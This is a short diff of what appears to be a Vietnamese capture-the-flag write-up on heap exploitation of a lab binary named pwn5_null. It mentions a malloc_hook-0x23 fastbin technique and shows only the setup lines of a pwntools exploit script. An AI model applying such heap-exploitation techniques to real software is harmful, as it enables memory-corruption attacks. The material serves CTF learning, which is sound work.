@@ -156,13 +156,17 @@ Chunk_4 chứa địa chỉ `malloc_hook-0x23` và khi free nó đi rồi thì s
 # Full code:
 
 ```
-from pwn import *
+from pwn import*
+context.log_level       = "DEBUG"
+context.arch            = "amd64"
 
-context.binary=exe=ELF("./pwn5_null_patched",checksec=False)
+elf = context.binary = ELF('./pwn5_null_patched', checksec=False)
 
-p=process(exe.path)
+p = process("./pwn5_null_patched")
 
-#gdb.attach(p,gdbscript='''''')
+#gdb.attach(p, gdbscript='''
+#vis
+#''')
 
 def create(idx,size,data):
     p.sendafter(b">\n",b"1")
